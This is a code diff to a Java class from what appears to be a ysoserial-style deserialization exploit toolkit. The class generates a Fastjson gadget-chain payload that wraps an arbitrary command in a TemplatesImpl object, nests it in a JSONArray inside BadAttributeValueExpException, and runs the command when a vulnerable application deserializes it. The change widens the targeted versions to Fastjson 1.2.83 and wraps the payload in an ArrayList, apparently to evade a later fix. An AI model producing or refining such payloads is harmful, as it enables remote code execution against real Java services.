@@ -8,9 +8,10 @@ import com.h2tg.ysogate.utils.PayloadRunner;
 import com.h2tg.ysogate.utils.Reflections;
 
 import javax.management.BadAttributeValueExpException;
+import java.util.ArrayList;
 import java.util.HashMap;
 
-@Dependencies({"com.alibaba.fastjson:<=1.2.xx"})
+@Dependencies({"com.alibaba.fastjson:<=1.2.83"})
 public class Fastjson1 implements CommandObjectPayload<Object>
 {
     public static void main(final String[] args) throws Exception
@@ -22,7 +23,9 @@ public class Fastjson1 implements CommandObjectPayload<Object>
     {
         final Object template = Gadgets.createTemplatesImpl(command);
         JSONArray jsonArray = new JSONArray();
-        jsonArray.add(template);
+        ArrayList arrayList = new ArrayList();
+        arrayList.add(template);
+        jsonArray.add(arrayList);
 
         BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
         Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);
